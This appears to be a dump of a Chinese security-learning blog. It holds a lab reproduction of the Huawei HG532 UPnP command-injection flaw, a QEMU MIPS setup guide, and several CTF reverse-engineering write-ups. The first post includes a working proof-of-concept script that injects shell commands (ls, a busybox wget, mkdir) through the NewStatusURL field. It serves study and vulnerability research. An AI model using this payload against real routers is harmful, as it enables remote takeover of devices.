设备：华为HG532漏洞：远程执行代码漏洞渗透方式：SQL注入固件下载地址： qemu就不说了，可参考上一个博客，ssh连接qemu的环境，然后通过scp将固件路由copy过去 通过chroot . sh切换根目录 ps：chroot的讲解 运行mic（后面会讲解固件ida分析过程） 固件ida分析 mips架构，根据师傅们的首先分析漏洞点位于Upnp的服务之中 Upnp：通用即插即用（英语：Universal Plug and Play，简称UPnP）是由“通用即插即用论坛”（UPnP™ Forum）推广的一套网络协议。该协议的目标是使家庭网络（数据共享、通信和娱乐）和公司网络中的各种设备能够相互无缝连接，并简化相关网络的实现。UPnP通过定义和发布基于开放、因特网通讯网协议标准的UPnP设备控制协议来实现这一目标。（来自于百度百科） 本来想分析一下soap协议但是同学说了解就可以，现在用的不多，所以这里就不多提了。 直接根据poc分析，因为使用到了NewDownloadURL，所以直接ida查询string，交叉引用找到函数的作用点 下面是关键汇编处，sprintf用到四个参数a0,a1,a2,a3,后面无缝衔接一个system(a0)，所以注入点就在a0，a0就是NewStatusURL的值，我们post一个闭合参数给a0，便可以执行任意命令 在kali段运行poc，实现ls，wget，mkdir等命令，复现成功 ls wget这里通过监听kali的80端口，进行测试，我们wget目标是让通过远程命令让固件对kali主机进行一个get操作，下图是实现成果 mkdir：建立一个flag文件 poc脚本 import requests headers = { &quot;Authorization&quot;: &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot; } data = &#39;&#39;&#39;&lt;?xml version=&quot;1.0&quot; ?&gt; &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt; &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt; &lt;NewStatusURL&gt;;ls bin;&lt;/NewStatusURL&gt; &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt; &lt;/u:Upgrade&gt; &lt;/s:Body&gt; &lt;/s:Envelope&gt; &#39;&#39;&#39; requests.post(&#39;http://192.168.66.132:37215/ctrlt/DeviceUpgrade_1&#39;,headers=headers,data=data) #/bin/busybox wget -g 192.168.66.132 -l /tmp/1 -r /1 #ls #mkdir flag 第一个复现的iot吧，还是有太多东西不懂，还需要继续学习，奥利给！","categories":[{"name":"漏洞","slug":"漏洞","permalink":"/categories/漏洞/"}],"tags":[],"keywords":[{"name":"漏洞","slug":"漏洞","permalink":"/categories/漏洞/"}]},{"title":"路由器逆向分析——qemu环境搭建","slug":"cve/路由器逆向分析——qemu环境搭建","date":"2020-03-20T02:14:43.000Z","updated":"2020-03-25T02:14:47.983Z","comments":true,"path":"2020/03/20/cve/路由器逆向分析——qemu环境搭建/","link":"","permalink":"/2020/03/20/cve/路由器逆向分析——qemu环境搭建/","excerpt":"","text":"iot漏洞复现，首先说一下qemu的环境配置。简单介绍一下qemu是个什么东西 虚拟机版本：kali-linux-2019.1a-amd64.iso qemu结构图来自于CloudDeveloper的简书师傅配置qemu的两个博客地址https://www.freebuf.com/vuls/160040.htmlhttps://blog.csdn.net/QQ1084283172/article/details/69652258brctl：Burnov qemu是由法布里斯·贝拉(Fabrice Bellard)所编写的以GPL许可证分发源码的模拟处理器，在GNU/Linux平台上使用广泛 默认支持多种架构。可以模拟 IA-32 (x86)个人电脑，AMD 64个人电脑，MIPS R4000, 升阳的SPARCsun3 与PowerPC(PReP 及 Power Macintosh)架构 最关键是他是纯软件化实现硬件结构，做出这些东西的人真的不是人，牛逼 经常跟kvm一起来使用的，KVM 是硬件辅助的虚拟化技术，主要负责 比较繁琐的 CPU 和内存虚拟化，而 Qemu 则负责 I/O 虚拟化 整个程序的结构运行图下图为qemu的翻译原理，guest code是模拟的cpu架构的字节码，通过翻译成中间TGC代码，在最后翻译成host代码也就是x86体系的代码简单来说就是一个虚拟机但是可以模拟不同的cpu架构，这是vm所做不到的，其中MIPS是固件用到的比较多的一种架构，所以可以用qemu来进行路由器模拟等等操作，逆向分析的一种小利器，但我现在还是入门，对很多工具了解的不是很多，需要再多多的去努力。 然后就简单配置一下qemu，这里师傅们的博客都很全面，我在这里照搬一些，主要是说一下中间我遇到的一些问题。配置原理我打算之后好好看一下linux操作系统，疫情期间，网课还是很有用的 安装： sudo apt-get install qemu sudo apt-get install qemu-user-static sudo apt-get install qemu-system 这个期间我出现了一个智商小插曲，apt-install之后我竟然自己通过命令行直接运行qemu，发现没反应，就开始怀疑了会人生。。。。这个程序本来就不能直接输命令行调用的，我镜像都没，用个泡泡茶壶 安装网络配置工具（主要用来连接网络的） apt-get install bridge-utils uml-utilities bridge-utils的一些介绍 这里就是我的个人理解了，没有找到对uml-utilities的具体解释，但知道bridge-utils（brctl）的一些功能，创建我们之后要用到的在虚拟机里配置的网桥br0，还创建了要配置的虚拟机网卡，保证虚拟机可以与外界通讯brctl的的一些可行操作 #添加虚拟网桥 brctl addbr br0 #将物理接口eno16777736添加到br0上 ifconfig addif br0 eno16777736 #为br0配置网络地址，这个地址在后面可以作为虚拟机的网关地 ifconfig br0 192.168.238.130/24 up #为网桥指定网关地址，在这个实验环境下，这个地址就是vmnet8的地址，作为网关地址 route add default gw 192.168.238.1 回归正题 修改/etc/network/interfaces的内容，直接在后面添加就行 #interfaces(5) file used by ifup(8) and ifdown(8) auto lo iface lo inet loopback # ubuntu 16.04的系统用ens33代替eth0 auto eth0 iface eth0 inet manual up ifconfig eth0 0.0.0.0 up auto br0 iface br0 inet dhcp bridge_ports eth0 bridge_stp off bridge_maxwait 1 这里被坑了一点点就是那个eth0，因为之前没改，我用的kali版本系统用的eth0，而当时师傅的代码上写的是ens33所以就一直没有连接成功 然后在/etc/qemu-ifup保存如下内容 #!/bin/sh echo &quot;Executing /etc/qemu-ifup&quot; echo &quot;Bringing $1 for bridged mode...&quot; sudo /sbin/ifconfig $1 0.0.0.0 promisc up echo &quot;Adding $1 to br0...&quot; sudo /sbin/brctl addif br0 $1 sleep 3 chmod赋予文件可执行权限，然后重启网络 sudo /etc/init.d/networking restart 关闭eth0启动桥br0 sudo ifdown eth0 sudo ifup br0 镜像下载https://people.debian.org/~aurel32/qemu/mips/这里我跟师傅用的一样的debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta 启动虚拟机 sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic,macaddr=00:16:3e:00:00:01 -net tap 这时候成功就会登进去如果你没有登录进去失败的话，看看镜像有没有错，登录密码和用户名都是root 查询本机ip地址ifconfig，如果出现error，就想之前一下查询interfaces，把里面的eth0改成eth1，然后 ifup etf1，ip地址就有了。中间有个nano操作，nano interfaces进行修改，ctrl+x退出之后通过ssh连接虚拟机 ssh root@虚拟机ip 通过scp将固件传送到虚拟机里，就可以开始分析啦 scp -r /root/cve/wr940-root root@虚拟机ip:/root/ ps：scp是通过ssh进行copy指令的，-r意思是文件迭代复制，就是全都复制过去，前面是发送方路径（千万记得加/root） 后面是接收方，空格也不要错，记得提前在目标虚拟机里mkdir一个root文件，什么名字都可以我这里跟师傅的博客取得一致。然后就复制上去了，就可以运行分析啥的啦，然后就是后面博客的事情啦~~~~","categories":[{"name":"漏洞","slug":"漏洞","permalink":"/categories/漏洞/"}],"tags":[],"keywords":[{"name":"漏洞","slug":"漏洞","permalink":"/categories/漏洞/"}]},{"title":"安洵杯 2019——crackMe","slug":"ctf/安洵杯 2019-crackMe","date":"2020-03-17T06:38:27.000Z","updated":"2020-05-14T07:41:57.594Z","comments":true,"path":"2020/03/17/ctf/安洵杯 2019-crackMe/","link":"","permalink":"/2020/03/17/ctf/安洵杯 2019-crackMe/","excerpt":"","text":"题目思路： 输入flag到byte_2BA1E4 修改base64的表，大小写互换 以where_are_u_now?作为16位密钥产生轮密钥 通过SM4加密算法，生成加密后的16位字节数 然后通过变种base64（非魔改），生成字符串 相邻两位位置进行交换得到最终的结果 解题过程：首先这道题是通过hook的方式来调用的各组函数，其中有反debug的内容，没看出是怎么反的所以直接用到了一个技巧，修改push内容然后修改eip到函数跳转地址即可。 按正常执行流程走，结束完base64的变表操作，如下图，然后在红线处进行eip跳转 到密钥产生函数 然后跳到SM加密函数，其中dword_2BA218是轮密钥，byte_2BA1E4是我们输入的值，byte_2BA180是输出的16个字节 然后是最终变换，函数区域，他先将结果Str2进行了邻位互换，然后进行的base64的变换 在这里的base64他是做了改动的，最终index值他做了一个+24%64的运算，如下图 而且因为16位不能整除3，最后两位补成叹号，如下图大致流程出来了，写代码就可以了，首先之前base64脚本进行一下变化，并且打印出原始的16个字节代码： def mo64_decode(a): tb = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&quot; #魔改的表 c=&#39;&#39; for i in range(len(a)): if(tb.index(a[i])&lt;24): b = str(bin(tb.index(a[i])+64-24)).replace(&quot;0b&quot;, &quot;&quot;).zfill(6) else: b=str(bin(tb.index(a[i])-24)).replace(&quot;0b&quot;,&quot;&quot;).zfill(6) #6 base64 5 base32 4 base16 c+=str(b) m=&quot;&quot; i=0;arr=[] for i in range(0,len(c),8): m+=chr(int(c[i:i+8],2)) arr.append(int(c[i:i+8],2)) print(arr) return m def mo64_encode(a): tb=&#39;abcdefghijklmnopqrstuvwxyzABCDEFQRSTUVWXYPGHIJKLMNOZ0123456789+/&#39; c=&#39;&#39; for i in range(len(a)): b=str(bin(ord(a[i])).replace(&quot;0b&quot;,&quot;&quot;)).zfill(8) c+=str(b) m=&quot;&quot; i=0 for i in range(0,len(c),6): m+=tb[int(c[i:i+6],2)] return m ch=&quot;U1ATIOpkOyWSvGm/YOYFR4&quot; #此处已交换 mo64_decode(ch) 产生数组[89, 208, 149, 41, 13, 242, 64, 6, 20, 244, 141, 39, 105, 6, 135, 78]嫁接到百度到了sm4算法中去，得到结果sm4算法： # S盒 SboxTable = \\ [ 0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05, 0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62, 0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6, 0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8, 0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35, 0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87, 0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e, 0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1, 0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3, 0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f, 0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51, 0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8, 0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0, 0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84, 0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48, ] # 常数FK FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc]; ENCRYPT = 0; DECRYPT = 1 # 固定参数CK CK = \\ [ 0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279 ] def padding(data): # 填充 print(&quot;plaintext:\\t&quot;, bytes(data)) file_data_list = list(data) lenth = len(file_data_list) # print (&quot;data lenth:&quot;, lenth) remainder = lenth % 16 if remainder != 0: i = 16 - remainder # i为需要填充的位数 # print (&quot;padding numbers = &quot;, i) for j in range(i): file_data_list.append(i) # 填充 char 0-(i-1) #if remainder == 0: #for k in range(16): #file_data_list.append(0x08) # 刚好的话 填充0x08 print(&quot;after PKCS5 padding:&quot;, file_data_list) return file_data_list def list_4_8_to_int32(key_data): # 列表4个8位，组成32位 return int((key_data[0] &lt;&lt; 24) | (key_data[1] &lt;&lt; 16) | (key_data[2] &lt;&lt; 8) | (key_data[3])) def n32_to_list4_8(n): # 把n分别取32位的每8位放入列表 return [int((n &gt;&gt; 24) &amp; 0xff), int((n &gt;&gt; 16) &amp; 0xff), int((n &gt;&gt; 8) &amp; 0xff), int((n) &amp; 0xff)] # 循环左移 def shift_left_n(x, n): return int(int(x &lt;&lt; n) &amp; 0xffffffff) def shift_logical_left(x, n): return shift_left_n(x, n) | int((x &gt;&gt; (32 - n)) &amp; 0xffffffff) # 两步合在一起实现了循环左移n位 def XOR(a, b): return list(map(lambda x, y: x ^ y, a, b)) # s盒查找 def sbox(idx): return SboxTable[idx] def extended_key_LB(ka): # 拓展密钥算法LB a = n32_to_list4_8(ka) # a是ka的每8位组成的列表 b = [sbox(i) for i in a] # 在s盒中每8位查找后，放入列表b，再组合成int bb bb = list_4_8_to_int32(b) rk = bb ^ (shift_logical_left(bb, 13)) ^ (shift_logical_left(bb, 23)) return rk def linear_transform_L(ka): # 线性变换L a = n32_to_list4_8(ka) b = [sbox(i) for i in a] bb = list_4_8_to_int32(b) # bb是经过s盒变换的32位数 return bb ^ (shift_logical_left(bb, 2)) ^ (shift_logical_left(bb, 10)) ^ (shift_logical_left(bb, 18)) ^ ( shift_logical_left(bb, 24)) # 书上公式 def sm4_round_function(x0, x1, x2, x3, rk): # 轮函数 return (x0 ^ linear_transform_L(x1 ^ x2 ^ x3 ^ rk)) class Sm4(object): def __init__(self): self.sk = [0] * 32 self.mode = ENCRYPT def sm4_set_key(self, key_data, mode): # 先算出拓展密钥 self.extended_key_last(key_data, mode) def extended_key_last(self, key, mode): # 密钥扩展算法 MK = [0, 0, 0, 0] k = [0] * 36 MK[0] = list_4_8_to_int32(key[0:4]) MK[1] = list_4_8_to_int32(key[4:8]) MK[2] = list_4_8_to_int32(key[8:12]) MK[3] = list_4_8_to_int32(key[12:16]) k[0:4] = XOR(MK, FK) for i in range(32): k[i + 4] = k[i] ^ (extended_key_LB(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ CK[i])) self.sk = k[4:] # 生成的32轮子密钥放到sk中 self.mode = mode if mode == DECRYPT: # 解密时rki逆序 self.sk.reverse() def sm4_one_round(self, sk, in_put): # 一轮算法 ，4个32位的字=128bit=16个字节（8*16） item = [list_4_8_to_int32(in_put[0:4]), list_4_8_to_int32(in_put[4:8]), list_4_8_to_int32(in_put[8:12]), list_4_8_to_int32(in_put[12:16])] # 4字节一个字，把每4个字节变成32位的int x = item for i in range(32): temp = x[3] x[3] = sm4_round_function(x[0], x[1], x[2], x[3], sk[i]) # x[3]成为x[4] x[0] = x[1] x[1] = x[2] x[2] = temp print(&quot;%dround-----&gt;&quot; % (i + 1), &quot;key:%-12d\\n&quot; % sk[i], &quot;result：&quot;, x) res = x # res = reduce (lambda x, y: [x[1], x[2], x[3], sm4_round_function (x[0], x[1], x[2], x[3], y)],sk, item) #32轮循环加密 res.reverse() rev = map(n32_to_list4_8, res) out_put = [] [out_put.extend(_) for _ in rev] return out_put def encrypt(self, input_data): # 块加密 output_data = [] tmp = [input_data[i:i + 16] for i in range(0, len(input_data), 16)] # 输入数据分块 [output_data.extend(each) for each in map(lambda x: self.sm4_one_round(self.sk, x), tmp)] return output_data def encrypt(mode, key, data): sm4_d = Sm4() sm4_d.sm4_set_key(key, mode) en_data = sm4_d.encrypt(data) return en_data def sm4_crypt_cbc(mode, key, iv, data): sm4_d = Sm4() sm4_d.sm4_set_key(key, mode) en_data = sm4_d.sm4_crypt_cbc(iv, data) return en_data if __name__ == &quot;__main__&quot;: data = &quot;1234567812345678&quot; print(&quot;plaintext: &quot;,data) data = bytes(data, &#39;ascii&#39;) key_data = [] print(&quot;16 bytes key:&quot;) tmp = &quot;where_are_u_now?&quot; [key_data.append(ord(i)) for i in tmp] for i in range(16): key_data[i] = key_data[i] print(key_data) sm4_d = Sm4() # 创建一个Sm4对象 sm4_d.sm4_set_key(key_data, ENCRYPT) # 加密模式 padding_data = padding(data) # 明文填充 en_data = sm4_d.encrypt(padding_data) # 加密 en_data = [89, 208, 149, 41, 13, 242, 64, 6, 20, 244, 141, 39, 105, 6, 135, 78] print(&quot;ciphertext:\\t&quot;, en_data) sm4_d.sm4_set_key(key_data, DECRYPT) # 解密模式 print(&quot;\\ndecode:&quot;) de_data = sm4_d.encrypt(en_data) # 解密 # print(file_data) print(&quot;plaintext：&quot;, de_data) print(&quot;after decode：&quot;, end=&#39;&#39;) [print(chr(i), end=&#39;&#39;) for i in de_data] #打印flag 得到结果SM4foRExcepioN?! sm4算法就保存了，至于学习的话，懂得大致原理就行，不是专门密码的不用太深","categories":[{"name":"ctf逆向","slug":"ctf逆向","permalink":"/categories/ctf逆向/"}],"tags":[],"keywords":[{"name":"ctf逆向","slug":"ctf逆向","permalink":"/categories/ctf逆向/"}]},{"title":"逆向练习","slug":"ctf/逆向练习","date":"2020-03-17T06:38:27.000Z","updated":"2020-04-07T09:03:56.218Z","comments":true,"path":"2020/03/17/ctf/逆向练习/","link":"","permalink":"/2020/03/17/ctf/逆向练习/","excerpt":"","text":"攻防世界————asong今天做了几道攻防世界的逆向题，有一道题比较麻烦，虽然不难，但耗费了不少时间，其中有很多时间是可以节省的，所以这次就把这道题记录下来。 本来打算直接静调出结果，但中间卡在了一个点上，不得不动调，虽然最后发现，动调并没有给多大的帮助0- 0 放到ida，我已经分好了类，首先输入，然后判断一下开头结尾，之后建立一个字典，最后对输入进行算数处理，逻辑很清晰，没有任何阻碍 建立字典里面有个函数说一下，算一个小坑吧，没在这里绊很长时间。首先，他是从that_girl文件里面根据单词出现的频率，每个单词对应相应的出现次数，然后建立了表格，当时我在这里犹豫了一会儿，在这个我标记的case函数里面，他将单词asc改成了相应下标值，我以为需要考虑，可到后来才发现，其实完全不需要考虑他们的位置，只需要记住对应的词频率就ok这里卡了一会的建立词频率的函数图 他在建立函数时，大小写全都放到一个词频数组里面去的，也就是说不区分大小写 然后运算处理也很简单，首先将我们的各个输入的字符，转化成相对应的频率，再位置变换，再移位交换，最后得到结果 python代码如下 flag=&quot;QCTF{&quot; #建立头 #将给的out文件里面的值取出来 fd=open(&quot;out&quot;,&quot;rb&quot;) #这里注意rb取得是数 buf=fd.read(1) arr=[];arr1=[] while(buf): arr.append(ord(buf)) buf=fd.read(1) fd.close() #最后的移位操作 for i in range(len(arr)): if(i): arr1.append(((arr[i]&gt;&gt;3)+((arr[(i-1)]&lt;&lt;5)&amp;0xe0))) else: arr1.append(((arr[i]&gt;&gt;3)+((arr[len(arr)-1]&lt;&lt;5)&amp;0xe0))) #print(arr1) #置换操作 shun=[22,0,6,2,30,24,9,1,21,7,18,10,8,12,17,23,13,4,3,14,19,11,20,16,15,5,25,36,27,28,29,37,31,32,33,26,34,35] #这个库之前找错了。。。。。。。。卡了很久，我太蠢了_(:з」∠)_ #置换算法1————暴力循环算法 for j in range(37): #因为是一个循环置换，所以让他循环一整个次数，就能回到最初点 i=0 p=arr1[0] while(shun[i]): arr1[i] = arr1[shun[i]] i=shun[i] arr1[i]=p #print(arr1) #置换算法2————逆向算法 j=1 p=arr1[j] for i in range(37): #这个就是倒回去一个一个找 arr1[j]=arr1[shun.index(j)] j=shun.index(j) arr1[j]=p #查找词频 （这里我没用python的dict字典方法，我感觉有点麻烦，还要用到zip函数，这里我建立了两个匹配数组，一样可以实现，个人认为dict也是建立了两个数组emmmmmmmm） dic=&quot;abcdefghijklmnopqrstuvwxyz_\\&#39;\\n &quot; #第一个字符串数组 arr0=[0]*len(dic) fw=open(&quot;that_girl&quot;,&quot;r&quot;) buf=fw.read(1) while(buf): arr0[dic.index(buf.lower())]+=1 #第二个词频数组 buf = fw.read(1) fw.close() #出结果 for i in range(len(arr1)): flag+=dic[arr0.index(arr1[i])] #根据词频去查之前的字典就得到相应的flag flag+=&quot;}&quot; print(flag) 最后祭奠一下卡了半天出错的地方的地方，这里他因为第二个数是0，所以出现了align8（意思是8个0）这个不合理的玩意 _ (:з」∠) _ _ (:з」∠) _ ，没有看到，所以没找到数组里的0，还以为逻辑有错，_ (:з」∠) _卡时候的心态爆炸，发现之后更心态爆炸align8图d键之后的图 可见有时候看到数据连在一起，先d一d是一个好习惯，_ (:з」∠) _（一种植物） 攻防世界————testre（西湖论剑预选赛）首先这道题是base58，俺看出来了它是一个进制转换的函数，但是原理搞了半天也没搞懂，还是算法基础太差，唉，不过虽然思考的时间很久，但最后自己有了一个很明确很好的理解思路，我感觉这也算是有收获，也算是一种成功吧，嘿嘿O(∩_∩)O~ 这个题就是一个base58的加密解密，base58和base64不同的地方是，base58是通过大进制转换，将其他进制转化成58进制，而base64,32,16都是通过2进制位数8位变6位实现的，所以这段代码就是一个进制转换代码，其中有很多混淆迷惑的部分，我们这里就只说在ida分析出来的这个进制算法。 接下来就来分析一下他的进制换算的算法思路吧~~~ ida中的核心算法图（横线是作用代码，未标横线便是混淆代码） v21是我们输入的值；v11是输出数组循环方式：外循环：输入字符循环内循环：每一个字符做进制运算，先%再\\一直到为0为止，然后分别赋到v11的各个数组里面去 开始我按照算法进行推理，但发现如果直接计算，是看不出什么规律的甚至越看越乱，一直到我在纸做了一下推理，才发现原理很简单。首先，我们回顾一下，十六进制0xabcd转十进制，首先要得到十进制末尾，很简单0xabcd%10，我做了一下实践，求余符合分配率，所以我可以分解成 0xa000 % 10 + 0xb00 % 10 + 0xc0 % 10 + 0xd % 10，然后想得到倒数第二位，那么就是0xabcd \\ 10 == X1,再让 X1 % 10，以此类推，怎么样是不是跟我们的上面的式子很是类似？接下来，回到我们的58进制 用十六进制转58进制，要注意的一个问题是，这里我们的十六进制是按照两个字节为一个整体（因为我们输入的字符asc是word型的，所以就按照word进行计算），其实可以说是256进制，我们就姑且称之为双十六进制，然后进行计算。假设我们输入值为0xabcd，按照算法逻辑，它先是进来0xab，V11[22] = 0xab % 58 ，然后的整除放到一边，我们先跳出第一层for循环，看下一个for循环，进来v21=0xcd 这时再一次计算 V11[22] = ((V11[22] &lt;&lt; 8) + 0xcd) % 58，然后得出58进制的末尾 这里不要直接算，把它拆分成如下 (((0xab % 58) &lt;&lt; 8) + 0xcd ) % 58 =((0xab00 % 58) + 0xcd ) % 58 =0xab00 % 58 +0xcd % 58 #(这里已经和我们上面十六进制转十进制完全一致了，下面更清晰一点) =0xabcd % 58 ps：公式用到的原理a % b &lt;&lt; 8 == a &lt;&lt; 8 % b ===== a % b == a00 % b (俺感觉是交换律)a % b % b = a % b 到这里就很清楚了，然后就是整除，再给第二位，之后根据下标对应字符，balabala的，就不多解释了，最后放一下我自己写的base58的py def str_hex(a): return &quot;&quot;.join([hex(ord(a[i])).replace(&quot;0x&quot;,&quot;&quot;) for i in range(len(a))]) #字符串转16进制 def encode_58(a): #加密 c=&quot;&quot; while(a!=0): c=dic[a%58]+c #取末尾 a=a//58 #整除进位 return c def decode_58(a): c=0 for i in range(len(a)): c+=pow(58,i)*dic.index(a[len(a)-i-1]) #解密这里我换了个方法，跟之前不一样了，因为从头直接翻译字符串有时候会出错。他的第一位可能是没用的，所以我们从最后一位开始就是最好的选择 out=&quot;&quot;;div=c while(div&gt;0): div, mod = divmod(div, 256);out=chr(mod)+out return out def hex_str(a): return &#39;&#39;.join([chr(int(a[i:i+2],16)) for i in range(len(a)-2,-1,-2)]) #16进制转字符串 print() input_en=&quot;flag{63510cf7-2b80-45e1-a186-21234897e5cd}&quot; input_de=&quot;BiJZHKtNhHyDe8kSF878CyFgq7h44x1MqUEXiUFJW3gRfQX1MjePwuKHB8&quot; dic=&quot;ABCDEFGHJKLMNPQRSTUVWXYZ123456789abcdefghijkmnopqrstuvwxyz&quot; #表 output=encode_58(int(str_hex(input_en),16)) print(&quot;encode ========&gt; &quot;,output) output=decode_58(input_de) print(&quot;decode ========&gt; &quot;,output) 效果图 从不同的思维方向去看待问题，问题便会得到解决，这次学习有很大的帮助，继续努力O(∩_∩)O~ 攻防世界————echo-server（XCTF 3rd-NJCTF-2017）花指令的简单去除，学习一下，深入学习将会在null比赛的逆向的wp中写出，这道题简单的介绍一下一些小的花指令，首先ida分析看到f5的一些不正常表现可以分析出来有花，去花 花简单来说就是junk_data，做一些无意义的汇编操作，并且让ida反汇编失败，这里因为花很简单，所以我们直接手动patch就行了，看到一些奇怪的汇编指令，比如突然jmp，毫无意义的地址，clc等等，都可以对其进行重组，以下是patch点。这里会是一个call loc，nop e8，后面的数c成代码下面的图同理，那个F1@g字符串是key，千万别nop 最后效果图 然后逻辑就很简单了简单的异或，这里就不说了，只是说一下花，就不浪费时间做异或练习了 攻防世界————first（XCTF 3rd-NJCTF-2017）开始有个线程把我吓一跳，后来发现对题目难度没什么影响，扔到ida里面分析，首先输入，然后将我们输入的值进行了一个归总异或运算，得到一个值v11后面循环建立线程其中有一个start_routine，关键函数，进去以后发现会对我们输入的值进行一个函数改造，然后判断，这里我坑了一会，这个函数是md5看出来了，但是出来的判定结果都是16位，我以为是按照[8:-8]的格式得到的16位md5，没想到直接取得开头16位，emmmmm 然后就是爆破脚本 import time import hashlib ch=&quot;flag&quot;;p=[&quot;beac2821ece8fc5c&quot;, &quot;ad749265ca7503ef&quot;, &quot;4386b38fc12c4227&quot;, &quot;b03ecc45a7ec2da7&quot;, &quot;be3c5ffe121734e8&quot;] time_start=time.clock() flag=&quot;juhu&quot; for ans in p: m1=0x30;m2=0x30;m3=0x30;m4=0x30 while(m1&lt;=0x74): m=hashlib.md5() ch=chr(m1)+chr(m2)+chr(m3)+chr(m4) m.update(ch) if(ans in m.hexdigest()): flag+=ch break if(m4&lt;=0x74): m4+=1 else: m4=0x30 if(m3&lt;=0x74): m3+=1 else: m3=0x30 if(m2&lt;=0x74): m2+=1 else: m2=0x30 m1+=1 print flag time_end=time.clock() print &quot;use time====&gt;&quot; + str(time_end-time_start) 得到juhuhfenlapsdunuhjifiuer，这里的脚本顺序是不太对的，因为他分了线程，线程的先后顺序是不一样的，题目解题的要求是最后res_md5的顺序按照，0,4,8,14,10,c（十六进制），排出来的，所以要调整一下顺序，flag就出来了，或者可以直接再写个脚本，把之后的那个鉴定给爆破出来，也可以直接动调一步一步调，很简单就出来了goodjobyougetthisflag233 我开始是直接动调的，但这里附上脚本把还是，算是练习一下 后来在写脚本的时候遇到了点问题，后来才明白这个题目一个根本意思，开始根据我们输入计算得出来的v11的输入顺序是按照他给的md5表的顺序来的，然后后面赋值的顺序又会发生变化，与之前的计算v11的输入顺序是不一样的，所以说是有两个顺序，如果这里他弄得恶心点，让第二次赋值输入顺序和md5顺序完全不一样，那可能就需要点时间了，有点恶心，但感觉这个题出的恰到好处，挺有意思的，稍微恶心点，就偏脑筋急转弯了。 ps：这里的脚本让我同时学到了一个找出所有排序的一个递归算法，真的牛逼，也会记录在逆向杂项里面脚本： #排序算法：这里就是用了一个换头的方法，我让a做第一位，剩下的递归，一直到只有一位，返回这一位 def px_re(s=&#39;&#39;): if(len(s)==1): return [s] #递归的末尾值 arr=[] #盛放每一次递归的出来的顺序数组 for i in range(len(s)): for j in px_re(s[0:i]+s[i+1:]): #这里就是讲开头的值取出，进行递归，比如&#39;abcd&#39;，最开头可能取a\\b\\c\\d四个值，用一个len把开头的可能性全取出来，然后往后递归 arr.append(s[i]+j) #数组拼接 return arr #返回每次递归产生的数组 #解题思路 